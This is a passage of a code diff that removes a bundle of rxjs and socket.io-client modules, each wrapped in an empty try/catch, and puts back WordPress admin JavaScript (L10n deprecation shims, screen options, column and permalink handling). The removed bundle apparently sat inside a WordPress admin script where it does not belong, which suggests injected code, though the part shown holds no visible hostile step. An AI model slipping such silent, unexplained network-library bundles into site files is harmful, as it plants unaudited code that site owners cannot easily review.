-Object.defineProperty(exports, "mergeAll", { enumerable: true, get: function () { return mergeAll_1.mergeAll; } });
-var flatMap_1 = require("./internal/operators/flatMap");
-Object.defineProperty(exports, "flatMap", { enumerable: true, get: function () { return flatMap_1.flatMap; } });
-var mergeMap_1 = require("./internal/operators/mergeMap");
-Object.defineProperty(exports, "mergeMap", { enumerable: true, get: function () { return mergeMap_1.mergeMap; } });
-var mergeMapTo_1 = require("./internal/operators/mergeMapTo");
-Object.defineProperty(exports, "mergeMapTo", { enumerable: true, get: function () { return mergeMapTo_1.mergeMapTo; } });
-var mergeScan_1 = require("./internal/operators/mergeScan");
-Object.defineProperty(exports, "mergeScan", { enumerable: true, get: function () { return mergeScan_1.mergeScan; } });
-var mergeWith_1 = require("./internal/operators/mergeWith");
-Object.defineProperty(exports, "mergeWith", { enumerable: true, get: function () { return mergeWith_1.mergeWith; } });
-var min_1 = require("./internal/operators/min");
-Object.defineProperty(exports, "min", { enumerable: true, get: function () { return min_1.min; } });
-var multicast_1 = require("./internal/operators/multicast");
-Object.defineProperty(exports, "multicast", { enumerable: true, get: function () { return multicast_1.multicast; } });
-var observeOn_1 = require("./internal/operators/observeOn");
-Object.defineProperty(exports, "observeOn", { enumerable: true, get: function () { return observeOn_1.observeOn; } });
-var onErrorResumeNextWith_1 = require("./internal/operators/onErrorResumeNextWith");
-Object.defineProperty(exports, "onErrorResumeNextWith", { enumerable: true, get: function () { return onErrorResumeNextWith_1.onErrorResumeNextWith; } });
-var pairwise_1 = require("./internal/operators/pairwise");
-Object.defineProperty(exports, "pairwise", { enumerable: true, get: function () { return pairwise_1.pairwise; } });
-var pluck_1 = require("./internal/operators/pluck");
-Object.defineProperty(exports, "pluck", { enumerable: true, get: function () { return pluck_1.pluck; } });
-var publish_1 = require("./internal/operators/publish");
-Object.defineProperty(exports, "publish", { enumerable: true, get: function () { return publish_1.publish; } });
-var publishBehavior_1 = require("./internal/operators/publishBehavior");
-Object.defineProperty(exports, "publishBehavior", { enumerable: true, get: function () { return publishBehavior_1.publishBehavior; } });
-var publishLast_1 = require("./internal/operators/publishLast");
-Object.defineProperty(exports, "publishLast", { enumerable: true, get: function () { return publishLast_1.publishLast; } });
-var publishReplay_1 = require("./internal/operators/publishReplay");
-Object.defineProperty(exports, "publishReplay", { enumerable: true, get: function () { return publishReplay_1.publishReplay; } });
-var raceWith_1 = require("./internal/operators/raceWith");
-Object.defineProperty(exports, "raceWith", { enumerable: true, get: function () { return raceWith_1.raceWith; } });
-var reduce_1 = require("./internal/operators/reduce");
-Object.defineProperty(exports, "reduce", { enumerable: true, get: function () { return reduce_1.reduce; } });
-var repeat_1 = require("./internal/operators/repeat");
-Object.defineProperty(exports, "repeat", { enumerable: true, get: function () { return repeat_1.repeat; } });
-var repeatWhen_1 = require("./internal/operators/repeatWhen");
-Object.defineProperty(exports, "repeatWhen", { enumerable: true, get: function () { return repeatWhen_1.repeatWhen; } });
-var retry_1 = require("./internal/operators/retry");
-Object.defineProperty(exports, "retry", { enumerable: true, get: function () { return retry_1.retry; } });
-var retryWhen_1 = require("./internal/operators/retryWhen");
-Object.defineProperty(exports, "retryWhen", { enumerable: true, get: function () { return retryWhen_1.retryWhen; } });
-var refCount_1 = require("./internal/operators/refCount");
-Object.defineProperty(exports, "refCount", { enumerable: true, get: function () { return refCount_1.refCount; } });
-var sample_1 = require("./internal/operators/sample");
-Object.defineProperty(exports, "sample", { enumerable: true, get: function () { return sample_1.sample; } });
-var sampleTime_1 = require("./internal/operators/sampleTime");
-Object.defineProperty(exports, "sampleTime", { enumerable: true, get: function () { return sampleTime_1.sampleTime; } });
-var scan_1 = require("./internal/operators/scan");
-Object.defineProperty(exports, "scan", { enumerable: true, get: function () { return scan_1.scan; } });
-var sequenceEqual_1 = require("./internal/operators/sequenceEqual");
-Object.defineProperty(exports, "sequenceEqual", { enumerable: true, get: function () { return sequenceEqual_1.sequenceEqual; } });
-var share_1 = require("./internal/operators/share");
-Object.defineProperty(exports, "share", { enumerable: true, get: function () { return share_1.share; } });
-var shareReplay_1 = require("./internal/operators/shareReplay");
-Object.defineProperty(exports, "shareReplay", { enumerable: true, get: function () { return shareReplay_1.shareReplay; } });
-var single_1 = require("./internal/operators/single");
-Object.defineProperty(exports, "single", { enumerable: true, get: function () { return single_1.single; } });
-var skip_1 = require("./internal/operators/skip");
-Object.defineProperty(exports, "skip", { enumerable: true, get: function () { return skip_1.skip; } });
-var skipLast_1 = require("./internal/operators/skipLast");
-Object.defineProperty(exports, "skipLast", { enumerable: true, get: function () { return skipLast_1.skipLast; } });
-var skipUntil_1 = require("./internal/operators/skipUntil");
-Object.defineProperty(exports, "skipUntil", { enumerable: true, get: function () { return skipUntil_1.skipUntil; } });
-var skipWhile_1 = require("./internal/operators/skipWhile");
-Object.defineProperty(exports, "skipWhile", { enumerable: true, get: function () { return skipWhile_1.skipWhile; } });
-var startWith_1 = require("./internal/operators/startWith");
-Object.defineProperty(exports, "startWith", { enumerable: true, get: function () { return startWith_1.startWith; } });
-var subscribeOn_1 = require("./internal/operators/subscribeOn");
-Object.defineProperty(exports, "subscribeOn", { enumerable: true, get: function () { return subscribeOn_1.subscribeOn; } });
-var switchAll_1 = require("./internal/operators/switchAll");
-Object.defineProperty(exports, "switchAll", { enumerable: true, get: function () { return switchAll_1.switchAll; } });
-var switchMap_1 = require("./internal/operators/switchMap");
-Object.defineProperty(exports, "switchMap", { enumerable: true, get: function () { return switchMap_1.switchMap; } });
-var switchMapTo_1 = require("./internal/operators/switchMapTo");
-Object.defineProperty(exports, "switchMapTo", { enumerable: true, get: function () { return switchMapTo_1.switchMapTo; } });
-var switchScan_1 = require("./internal/operators/switchScan");
-Object.defineProperty(exports, "switchScan", { enumerable: true, get: function () { return switchScan_1.switchScan; } });
-var take_1 = require("./internal/operators/take");
-Object.defineProperty(exports, "take", { enumerable: true, get: function () { return take_1.take; } });
-var takeLast_1 = require("./internal/operators/takeLast");
-Object.defineProperty(exports, "takeLast", { enumerable: true, get: function () { return takeLast_1.takeLast; } });
-var takeUntil_1 = require("./internal/operators/takeUntil");
-Object.defineProperty(exports, "takeUntil", { enumerable: true, get: function () { return takeUntil_1.takeUntil; } });
-var takeWhile_1 = require("./internal/operators/takeWhile");
-Object.defineProperty(exports, "takeWhile", { enumerable: true, get: function () { return takeWhile_1.takeWhile; } });
-var tap_1 = require("./internal/operators/tap");
-Object.defineProperty(exports, "tap", { enumerable: true, get: function () { return tap_1.tap; } });
-var throttle_1 = require("./internal/operators/throttle");
-Object.defineProperty(exports, "throttle", { enumerable: true, get: function () { return throttle_1.throttle; } });
-var throttleTime_1 = require("./internal/operators/throttleTime");
-Object.defineProperty(exports, "throttleTime", { enumerable: true, get: function () { return throttleTime_1.throttleTime; } });
-var throwIfEmpty_1 = require("./internal/operators/throwIfEmpty");
-Object.defineProperty(exports, "throwIfEmpty", { enumerable: true, get: function () { return throwIfEmpty_1.throwIfEmpty; } });
-var timeInterval_1 = require("./internal/operators/timeInterval");
-Object.defineProperty(exports, "timeInterval", { enumerable: true, get: function () { return timeInterval_1.timeInterval; } });
-var timeout_2 = require("./internal/operators/timeout");
-Object.defineProperty(exports, "timeout", { enumerable: true, get: function () { return timeout_2.timeout; } });
-var timeoutWith_1 = require("./internal/operators/timeoutWith");
-Object.defineProperty(exports, "timeoutWith", { enumerable: true, get: function () { return timeoutWith_1.timeoutWith; } });
-var timestamp_1 = require("./internal/operators/timestamp");
-Object.defineProperty(exports, "timestamp", { enumerable: true, get: function () { return timestamp_1.timestamp; } });
-var toArray_1 = require("./internal/operators/toArray");
-Object.defineProperty(exports, "toArray", { enumerable: true, get: function () { return toArray_1.toArray; } });
-var window_1 = require("./internal/operators/window");
-Object.defineProperty(exports, "window", { enumerable: true, get: function () { return window_1.window; } });
-var windowCount_1 = require("./internal/operators/windowCount");
-Object.defineProperty(exports, "windowCount", { enumerable: true, get: function () { return windowCount_1.windowCount; } });
-var windowTime_1 = require("./internal/operators/windowTime");
-Object.defineProperty(exports, "windowTime", { enumerable: true, get: function () { return windowTime_1.windowTime; } });
-var windowToggle_1 = require("./internal/operators/windowToggle");
-Object.defineProperty(exports, "windowToggle", { enumerable: true, get: function () { return windowToggle_1.windowToggle; } });
-var windowWhen_1 = require("./internal/operators/windowWhen");
-Object.defineProperty(exports, "windowWhen", { enumerable: true, get: function () { return windowWhen_1.windowWhen; } });
-var withLatestFrom_1 = require("./internal/operators/withLatestFrom");
-Object.defineProperty(exports, "withLatestFrom", { enumerable: true, get: function () { return withLatestFrom_1.withLatestFrom; } });
-var zipAll_1 = require("./internal/operators/zipAll");
-Object.defineProperty(exports, "zipAll", { enumerable: true, get: function () { return zipAll_1.zipAll; } });
-var zipWith_1 = require("./internal/operators/zipWith");
-Object.defineProperty(exports, "zipWith", { enumerable: true, get: function () { return zipWith_1.zipWith; } });
-//# sourceMappingURL=index.js.map
-}catch(e){}
-})();
-
-/* >>> socket.io-client (3296 bytes) <<< */
-(function(){
-try{
-"use strict";
-var __importDefault = (this && this.__importDefault) || function (mod) {
-    return (mod && mod.__esModule) ? mod : { "default": mod };
-};
-Object.defineProperty(exports, "__esModule", { value: true });
-exports.WebTransport = exports.WebSocket = exports.NodeWebSocket = exports.XHR = exports.NodeXHR = exports.Fetch = exports.Socket = exports.Manager = exports.protocol = void 0;
-exports.io = lookup;
-exports.connect = lookup;
-exports.default = lookup;
-const url_js_1 = require("./url.js");
-const manager_js_1 = require("./manager.js");
-Object.defineProperty(exports, "Manager", { enumerable: true, get: function () { return manager_js_1.Manager; } });
-const socket_js_1 = require("./socket.js");
-Object.defineProperty(exports, "Socket", { enumerable: true, get: function () { return socket_js_1.Socket; } });
-const debug_1 = __importDefault(require("debug")); // debug()
-const debug = (0, debug_1.default)("socket.io-client"); // debug()
 /**
- * Managers cache.
- */
-const cache = {};
-function lookup(uri, opts) {
-    if (typeof uri === "object") {
-        opts = uri;
-        uri = undefined;
-    }
-    opts = opts || {};
-    const parsed = (0, url_js_1.url)(uri, opts.path || "/socket.io");
-    const source = parsed.source;
-    const id = parsed.id;
-    const path = parsed.path;
-    const sameNamespace = cache[id] && path in cache[id]["nsps"];
-    const newConnection = opts.forceNew ||
-        opts["force new connection"] ||
-        false === opts.multiplex ||
-        sameNamespace;
-    let io;
-    if (newConnection) {
-        debug("ignoring socket cache for %s", source);
-        io = new manager_js_1.Manager(source, opts);
-    }
-    else {
-        if (!cache[id]) {
-            debug("new io instance for %s", source);
-            cache[id] = new manager_js_1.Manager(source, opts);
-        }
-        io = cache[id];
-    }
-    if (parsed.query && !opts.query) {
-        opts.query = parsed.queryKey;
-    }
-    return io.socket(parsed.path, opts);
-}
-// so that "lookup" can be used both as a function (e.g. `io(...)`) and as a
-// namespace (e.g. `io.connect(...)`), for backward compatibility
-Object.assign(lookup, {
-    Manager: manager_js_1.Manager,
-    Socket: socket_js_1.Socket,
-    io: lookup,
-    connect: lookup,
-});
-/**
- * Protocol version.
+ * Throws an error for a deprecated property.
  *
- * @public
+ * @since 5.5.1
+ *
+ * @param {string} propName    The property that was used.
+ * @param {string} version     The version of WordPress that deprecated the property.
+ * @param {string} replacement The property that should have been used.
  */
-var socket_io_parser_1 = require("socket.io-parser");
-Object.defineProperty(exports, "protocol", { enumerable: true, get: function () { return socket_io_parser_1.protocol; } });
-var engine_io_client_1 = require("engine.io-client");
-Object.defineProperty(exports, "Fetch", { enumerable: true, get: function () { return engine_io_client_1.Fetch; } });
-Object.defineProperty(exports, "NodeXHR", { enumerable: true, get: function () { return engine_io_client_1.NodeXHR; } });
-Object.defineProperty(exports, "XHR", { enumerable: true, get: function () { return engine_io_client_1.XHR; } });
-Object.defineProperty(exports, "NodeWebSocket", { enumerable: true, get: function () { return engine_io_client_1.NodeWebSocket; } });
-Object.defineProperty(exports, "WebSocket", { enumerable: true, get: function () { return engine_io_client_1.WebSocket; } });
-Object.defineProperty(exports, "WebTransport", { enumerable: true, get: function () { return engine_io_client_1.WebTransport; } });
+function deprecatedProperty( propName, version, replacement ) {
+	var message;
 
-module.exports = lookup;
+	if ( 'undefined' !== typeof replacement ) {
+		message = sprintf(
+			/* translators: 1: Deprecated property name, 2: Version number, 3: Alternative property name. */
+			__( '%1$s is deprecated since version %2$s! Use %3$s instead.' ),
+			propName,
+			version,
+			replacement
+		);
+	} else {
+		message = sprintf(
+			/* translators: 1: Deprecated property name, 2: Version number. */
+			__( '%1$s is deprecated since version %2$s with no alternative available.' ),
+			propName,
+			version
+		);
+	}
 
-}catch(e){}
+	window.console.warn( message );
+}
+
+/**
+ * Deprecate all properties on an object.
+ *
+ * @since 5.5.1
+ * @since 5.6.0 Added the `version` parameter.
+ *
+ * @param {string} name       The name of the object, i.e. commonL10n.
+ * @param {object} l10nObject The object to deprecate the properties on.
+ * @param {string} version    The version of WordPress that deprecated the property.
+ *
+ * @return {object} The object with all its properties deprecated.
+ */
+function deprecateL10nObject( name, l10nObject, version ) {
+	var deprecatedObject = {};
+
+	Object.keys( l10nObject ).forEach( function( key ) {
+		var prop = l10nObject[ key ];
+		var propName = name + '.' + key;
+
+		if ( 'object' === typeof prop ) {
+			Object.defineProperty( deprecatedObject, key, { get: function() {
+				deprecatedProperty( propName, version, prop.alternative );
+				return prop.func();
+			} } );
+		} else {
+			Object.defineProperty( deprecatedObject, key, { get: function() {
+				deprecatedProperty( propName, version, 'wp.i18n' );
+				return prop;
+			} } );
+		}
+	} );
+
+	return deprecatedObject;
+}
+
+window.wp.deprecateL10nObject = deprecateL10nObject;
+
+/**
+ * Removed in 5.5.0, needed for back-compatibility.
+ *
+ * @since 2.6.0
+ * @deprecated 5.5.0
+ */
+window.commonL10n = window.commonL10n || {
+	warnDelete: '',
+	dismiss: '',
+	collapseMenu: '',
+	expandMenu: ''
+};
+
+window.commonL10n = deprecateL10nObject( 'commonL10n', window.commonL10n, '5.5.0' );
+
+/**
+ * Removed in 5.5.0, needed for back-compatibility.
+ *
+ * @since 3.3.0
+ * @deprecated 5.5.0
+ */
+window.wpPointerL10n = window.wpPointerL10n || {
+	dismiss: ''
+};
+
+window.wpPointerL10n = deprecateL10nObject( 'wpPointerL10n', window.wpPointerL10n, '5.5.0' );
+
+/**
+ * Removed in 5.5.0, needed for back-compatibility.
+ *
+ * @since 4.3.0
+ * @deprecated 5.5.0
+ */
+window.userProfileL10n = window.userProfileL10n || {
+	warn: '',
+	warnWeak: '',
+	show: '',
+	hide: '',
+	cancel: '',
+	ariaShow: '',
+	ariaHide: ''
+};
+
+window.userProfileL10n = deprecateL10nObject( 'userProfileL10n', window.userProfileL10n, '5.5.0' );
+
+/**
+ * Removed in 5.5.0, needed for back-compatibility.
+ *
+ * @since 4.9.6
+ * @deprecated 5.5.0
+ */
+window.privacyToolsL10n = window.privacyToolsL10n || {
+	noDataFound: '',
+	foundAndRemoved: '',
+	noneRemoved: '',
+	someNotRemoved: '',
+	removalError: '',
+	emailSent: '',
+	noExportFile: '',
+	exportError: ''
+};
+
+window.privacyToolsL10n = deprecateL10nObject( 'privacyToolsL10n', window.privacyToolsL10n, '5.5.0' );
+
+/**
+ * Removed in 5.5.0, needed for back-compatibility.
+ *
+ * @since 3.6.0
+ * @deprecated 5.5.0
+ */
+window.authcheckL10n = {
+	beforeunload: ''
+};
+
+window.authcheckL10n = window.authcheckL10n || deprecateL10nObject( 'authcheckL10n', window.authcheckL10n, '5.5.0' );
+
+/**
+ * Removed in 5.5.0, needed for back-compatibility.
+ *
+ * @since 2.8.0
+ * @deprecated 5.5.0
+ */
+window.tagsl10n = {
+	noPerm: '',
+	broken: ''
+};
+
+window.tagsl10n = window.tagsl10n || deprecateL10nObject( 'tagsl10n', window.tagsl10n, '5.5.0' );
+
+/**
+ * Removed in 5.5.0, needed for back-compatibility.
+ *
+ * @since 2.5.0
+ * @deprecated 5.5.0
+ */
+window.adminCommentsL10n = window.adminCommentsL10n || {
+	hotkeys_highlight_first: {
+		alternative: 'window.adminCommentsSettings.hotkeys_highlight_first',
+		func: function() { return window.adminCommentsSettings.hotkeys_highlight_first; }
+	},
+	hotkeys_highlight_last: {
+		alternative: 'window.adminCommentsSettings.hotkeys_highlight_last',
+		func: function() { return window.adminCommentsSettings.hotkeys_highlight_last; }
+	},
+	replyApprove: '',
+	reply: '',
+	warnQuickEdit: '',
+	warnCommentChanges: '',
+	docTitleComments: '',
+	docTitleCommentsCount: ''
+};
+
+window.adminCommentsL10n = deprecateL10nObject( 'adminCommentsL10n', window.adminCommentsL10n, '5.5.0' );
+
+/**
+ * Removed in 5.5.0, needed for back-compatibility.
+ *
+ * @since 2.5.0
+ * @deprecated 5.5.0
+ */
+window.tagsSuggestL10n = window.tagsSuggestL10n || {
+	tagDelimiter: '',
+	removeTerm: '',
+	termSelected: '',
+	termAdded: '',
+	termRemoved: ''
+};
+
+window.tagsSuggestL10n = deprecateL10nObject( 'tagsSuggestL10n', window.tagsSuggestL10n, '5.5.0' );
+
+/**
+ * Removed in 5.5.0, needed for back-compatibility.
+ *
+ * @since 3.5.0
+ * @deprecated 5.5.0
+ */
+window.wpColorPickerL10n = window.wpColorPickerL10n || {
+	clear: '',
+	clearAriaLabel: '',
+	defaultString: '',
+	defaultAriaLabel: '',
+	pick: '',
+	defaultLabel: ''
+};
+
+window.wpColorPickerL10n = deprecateL10nObject( 'wpColorPickerL10n', window.wpColorPickerL10n, '5.5.0' );
+
+/**
+ * Removed in 5.5.0, needed for back-compatibility.
+ *
+ * @since 2.7.0
+ * @deprecated 5.5.0
+ */
+window.attachMediaBoxL10n = window.attachMediaBoxL10n || {
+	error: ''
+};
+
+window.attachMediaBoxL10n = deprecateL10nObject( 'attachMediaBoxL10n', window.attachMediaBoxL10n, '5.5.0' );
+
+/**
+ * Removed in 5.5.0, needed for back-compatibility.
+ *
+ * @since 2.5.0
+ * @deprecated 5.5.0
+ */
+window.postL10n = window.postL10n || {
+	ok: '',
+	cancel: '',
+	publishOn: '',
+	publishOnFuture: '',
+	publishOnPast: '',
+	dateFormat: '',
+	showcomm: '',
+	endcomm: '',
+	publish: '',
+	schedule: '',
+	update: '',
+	savePending: '',
+	saveDraft: '',
+	'private': '',
+	'public': '',
+	publicSticky: '',
+	password: '',
+	privatelyPublished: '',
+	published: '',
+	saveAlert: '',
+	savingText: '',
+	permalinkSaved: ''
+};
+
+window.postL10n = deprecateL10nObject( 'postL10n', window.postL10n, '5.5.0' );
+
+/**
+ * Removed in 5.5.0, needed for back-compatibility.
+ *
+ * @since 2.7.0
+ * @deprecated 5.5.0
+ */
+window.inlineEditL10n = window.inlineEditL10n || {
+	error: '',
+	ntdeltitle: '',
+	notitle: '',
+	comma: '',
+	saved: ''
+};
+
+window.inlineEditL10n = deprecateL10nObject( 'inlineEditL10n', window.inlineEditL10n, '5.5.0' );
+
+/**
+ * Removed in 5.5.0, needed for back-compatibility.
+ *
+ * @since 2.7.0
+ * @deprecated 5.5.0
+ */
+window.plugininstallL10n = window.plugininstallL10n || {
+	plugin_information: '',
+	plugin_modal_label: '',
+	ays: ''
+};
+
+window.plugininstallL10n = deprecateL10nObject( 'plugininstallL10n', window.plugininstallL10n, '5.5.0' );
+
+/**
+ * Removed in 5.5.0, needed for back-compatibility.
+ *
+ * @since 3.0.0
+ * @deprecated 5.5.0
+ */
+window.navMenuL10n = window.navMenuL10n || {
+	noResultsFound: '',
+	warnDeleteMenu: '',
+	saveAlert: '',
+	untitled: ''
+};
+
+window.navMenuL10n = deprecateL10nObject( 'navMenuL10n', window.navMenuL10n, '5.5.0' );
+
+/**
+ * Removed in 5.5.0, needed for back-compatibility.
+ *
+ * @since 2.5.0
+ * @deprecated 5.5.0
+ */
+window.commentL10n = window.commentL10n || {
+	submittedOn: '',
+	dateFormat: ''
+};
+
+window.commentL10n = deprecateL10nObject( 'commentL10n', window.commentL10n, '5.5.0' );
+
+/**
+ * Removed in 5.5.0, needed for back-compatibility.
+ *
+ * @since 2.9.0
+ * @deprecated 5.5.0
+ */
+window.setPostThumbnailL10n = window.setPostThumbnailL10n || {
+	setThumbnail: '',
+	saving: '',
+	error: '',
+	done: ''
+};
+
+window.setPostThumbnailL10n = deprecateL10nObject( 'setPostThumbnailL10n', window.setPostThumbnailL10n, '5.5.0' );
+
+/**
+ * Removed in 6.5.0, needed for back-compatibility.
+ *
+ * @since 4.5.0
+ * @deprecated 6.5.0
+ */
+window.uiAutocompleteL10n = window.uiAutocompleteL10n || {
+	noResults: '',
+	oneResult: '',
+	manyResults: '',
+	itemSelected: ''
+};
+
+window.uiAutocompleteL10n = deprecateL10nObject( 'uiAutocompleteL10n', window.uiAutocompleteL10n, '6.5.0' );
+
+/**
+ * Removed in 3.3.0, needed for back-compatibility.
+ *
+ * @since 2.7.0
+ * @deprecated 3.3.0
+ */
+window.adminMenu = {
+	init : function() {},
+	fold : function() {},
+	restoreMenuState : function() {},
+	toggle : function() {},
+	favorites : function() {}
+};
+
+// Show/hide/save table columns.
+window.columns = {
+
+	/**
+	 * Initializes the column toggles in the screen options.
+	 *
+	 * Binds an onClick event to the checkboxes to show or hide the table columns
+	 * based on their toggled state. And persists the toggled state.
+	 *
+	 * @since 2.7.0
+	 *
+	 * @return {void}
+	 */
+	init : function() {
+		var that = this;
+		$('.hide-column-tog', '#adv-settings').on( 'click', function() {
+			var $t = $(this), column = $t.val();
+			if ( $t.prop('checked') )
+				that.checked(column);
+			else
+				that.unchecked(column);
+
+			columns.saveManageColumnsState();
+		});
+	},
+
+	/**
+	 * Saves the toggled state for the columns.
+	 *
+	 * Saves whether the columns should be shown or hidden on a page.
+	 *
+	 * @since 3.0.0
+	 *
+	 * @return {void}
+	 */
+	saveManageColumnsState : function() {
+		var hidden = this.hidden();
+		$.post(
+			ajaxurl,
+			{
+				action: 'hidden-columns',
+				hidden: hidden,
+				screenoptionnonce: $('#screenoptionnonce').val(),
+				page: pagenow
+			},
+			function() {
+				wp.a11y.speak( __( 'Screen Options updated.' ) );
+			}
+		);
+	},
+
+	/**
+	 * Makes a column visible and adjusts the column span for the table.
+	 *
+	 * @since 3.0.0
+	 * @param {string} column The column name.
+	 *
+	 * @return {void}
+	 */
+	checked : function(column) {
+		$('.column-' + column).removeClass( 'hidden' );
+		this.colSpanChange(+1);
+	},
+
+	/**
+	 * Hides a column and adjusts the column span for the table.
+	 *
+	 * @since 3.0.0
+	 * @param {string} column The column name.
+	 *
+	 * @return {void}
+	 */
+	unchecked : function(column) {
+		$('.column-' + column).addClass( 'hidden' );
+		this.colSpanChange(-1);
+	},
+
+	/**
+	 * Gets all hidden columns.
+	 *
+	 * @since 3.0.0
+	 *
+	 * @return {string} The hidden column names separated by a comma.
+	 */
+	hidden : function() {
+		return $( '.manage-column[id]' ).filter( '.hidden' ).map(function() {
+			return this.id;
+		}).get().join( ',' );
+	},
+
+	/**
+	 * Gets the checked column toggles from the screen options.
+	 *
+	 * @since 3.0.0
+	 *
+	 * @return {string} String containing the checked column names.
+	 */
+	useCheckboxesForHidden : function() {
+		this.hidden = function(){
+			return $('.hide-column-tog').not(':checked').map(function() {
+				var id = this.id;
+				return id.substring( id, id.length - 5 );
+			}).get().join(',');
+		};
+	},
+
+	/**
+	 * Adjusts the column span for the table.
+	 *
+	 * @since 3.1.0
+	 *
+	 * @param {number} diff The modifier for the column span.
+	 */
+	colSpanChange : function(diff) {
+		var $t = $('table').find('.colspanchange'), n;
+		if ( !$t.length )
+			return;
+		n = parseInt( $t.attr('colspan'), 10 ) + diff;
+		$t.attr('colspan', n.toString());
+	}
+};
+
+$( function() { columns.init(); } );
+
+/**
+ * Validates that the required form fields are not empty.
+ *
+ * @since 2.9.0
+ *
+ * @param {jQuery} form The form to validate.
+ *
+ * @return {boolean} Returns true if all required fields are not an empty string.
+ */
+window.validateForm = function( form ) {
+	return !$( form )
+		.find( '.form-required' )
+		.filter( function() { return $( ':input:visible', this ).val() === ''; } )
+		.addClass( 'form-invalid' )
+		.find( ':input:visible' )
+		.on( 'change', function() { $( this ).closest( '.form-invalid' ).removeClass( 'form-invalid' ); } )
+		.length;
+};
+
+// Stub for doing better warnings.
+/**
+ * Shows message pop-up notice or confirmation message.
+ *
+ * @since 2.7.0
+ *
+ * @type {{warn: showNotice.warn, note: showNotice.note}}
+ *
+ * @return {void}
+ */
+window.showNotice = {
+
+	/**
+	 * Shows a delete confirmation pop-up message.
+	 *
+	 * @since 2.7.0
+	 *
+	 * @return {boolean} Returns true if the message is confirmed.
+	 */
+	warn : function() {
+		if ( confirm( __( 'You are about to permanently delete these items from your site.\nThis action cannot be undone.\n\'Cancel\' to stop, \'OK\' to delete.' ) ) ) {
+			return true;
+		}
+
+		return false;
+	},
+
+	/**
+	 * Shows an alert message.
+	 *
+	 * @since 2.7.0
+	 *
+	 * @param text The text to display in the message.
+	 */
+	note : function(text) {
+		alert(text);
+	}
+};
+
+/**
+ * Represents the functions for the meta screen options panel.
+ *
+ * @since 3.2.0
+ *
+ * @type {{element: null, toggles: null, page: null, init: screenMeta.init,
+ *         toggleEvent: screenMeta.toggleEvent, open: screenMeta.open,
+ *         close: screenMeta.close}}
+ *
+ * @return {void}
+ */
+window.screenMeta = {
+	element: null, // #screen-meta
+	toggles: null, // .screen-meta-toggle
+	page:    null, // #wpcontent
+
+	/**
+	 * Initializes the screen meta options panel.
+	 *
+	 * @since 3.2.0
+	 *
+	 * @return {void}
+	 */
+	init: function() {
+		this.element = $('#screen-meta');
+		this.toggles = $( '#screen-meta-links' ).find( '.show-settings' );
+		this.page    = $('#wpcontent');
+
+		this.toggles.on( 'click', this.toggleEvent );
+	},
+
+	/**
+	 * Toggles the screen meta options panel.
+	 *
+	 * @since 3.2.0
+	 *
+	 * @return {void}
+	 */
+	toggleEvent: function() {
+		var panel = $( '#' + $( this ).attr( 'aria-controls' ) );
+
+		if ( !panel.length )
+			return;
+
+		if ( panel.is(':visible') )
+			screenMeta.close( panel, $(this) );
+		else
+			screenMeta.open( panel, $(this) );
+	},
+
+	/**
+	 * Opens the screen meta options panel.
+	 *
+	 * @since 3.2.0
+	 *
+	 * @param {jQuery} panel  The screen meta options panel div.
+	 * @param {jQuery} button The toggle button.
+	 *
+	 * @return {void}
+	 */
+	open: function( panel, button ) {
+
+		$( '#screen-meta-links' ).find( '.screen-meta-toggle' ).not( button.parent() ).css( 'visibility', 'hidden' );
+
+		panel.parent().show();
+
+		/**
+		 * Sets the focus to the meta options panel and adds the necessary CSS classes.
+		 *
+		 * @since 3.2.0
+		 *
+		 * @return {void}
+		 */
+		panel.slideDown( 'fast', function() {
+			panel.removeClass( 'hidden' ).trigger( 'focus' );
+			button.addClass( 'screen-meta-active' ).attr( 'aria-expanded', true );
+		});
+
+		$document.trigger( 'screen:options:open' );
+	},
+
+	/**
+	 * Closes the screen meta options panel.
+	 *
+	 * @since 3.2.0
+	 *
+	 * @param {jQuery} panel  The screen meta options panel div.
+	 * @param {jQuery} button The toggle button.
+	 *
+	 * @return {void}
+	 */
+	close: function( panel, button ) {
+		/**
+		 * Hides the screen meta options panel.
+		 *
+		 * @since 3.2.0
+		 *
+		 * @return {void}
+		 */
+		panel.slideUp( 'fast', function() {
+			button.removeClass( 'screen-meta-active' ).attr( 'aria-expanded', false );
+			$('.screen-meta-toggle').css('visibility', '');
+			panel.parent().hide();
+			panel.addClass( 'hidden' );
+		});
+
+		$document.trigger( 'screen:options:close' );
+	}
+};
+
+/**
+ * Initializes the help tabs in the help panel.
+ *
+ * @param {Event} e The event object.
+ *
+ * @return {void}
+ */
+$('.contextual-help-tabs').on( 'click', 'a', function(e) {
+	var link = $(this),
+		panel;
+
+	e.preventDefault();
+
+	// Don't do anything if the click is for the tab already showing.
+	if ( link.is('.active a') )
+		return false;
+
+	// Links.
+	$('.contextual-help-tabs .active').removeClass('active');
+	link.parent('li').addClass('active');
+
+	panel = $( link.attr('href') );
+
+	// Panels.
+	$('.help-tab-content').not( panel ).removeClass('active').hide();
+	panel.addClass('active').show();
+});
+
+/**
+ * Update custom permalink structure via buttons.
+ */
+var permalinkStructureFocused = false,
+    $permalinkStructure       = $( '#permalink_structure' ),
+    $permalinkStructureInputs = $( '.permalink-structure input:radio' ),
+    $permalinkCustomSelection = $( '#custom_selection' ),
+    $availableStructureTags   = $( '.form-table.permalink-structure .available-structure-tags button' );
+
+// Change permalink structure input when selecting one of the common structures.
+$permalinkStructureInputs.on( 'change', function() {
+	if ( 'custom' === this.value ) {
+		return;
+	}
+
+	$permalinkStructure.val( this.value );
+
+	// Update button states after selection.
+	$availableStructureTags.each( function() {
+		changeStructureTagButtonState( $( this ) );
+	} );
+} );
+
+$permalinkStructure.on( 'click input', function() {
+	$permalinkCustomSelection.prop( 'checked', true );
+} );
+
+// Check if the permalink structure input field has had focus at least once.
+$permalinkStructure.on( 'focus', function( event ) {
+	permalinkStructureFocused = true;
+	$( this ).off( event );
+} );
+
+/**
+ * Enables or disables a structure tag button depending on its usage.
+ *
+ * If the structure is already used in the custom permalink structure,
+ * it will be disabled.
+ *
+ * @param {Object} button Button jQuery object.
+ */
+function changeStructureTagButtonState( button ) {
+	if ( -1 !== $permalinkStructure.val().indexOf( button.text().trim() ) ) {
+		button.attr( 'data-label', button.attr( 'aria-label' ) );
+		button.attr( 'aria-label', button.attr( 'data-used' ) );
+		button.attr( 'aria-pressed', true );
+		button.addClass( 'active' );
+	} else if ( button.attr( 'data-label' ) ) {
+		button.attr( 'aria-label', button.attr( 'data-label' ) );
+		button.attr( 'aria-pressed', false );
+		button.removeClass( 'active' );
+	}
+}
+
+// Check initial button state.
+$availableStructureTags.each( function() {
+	changeStructureTagButtonState( $( this ) );
+} );
+
+// Observe permalink structure field and disable buttons of tags that are already present.
+$permalinkStructure.on( 'change', function() {
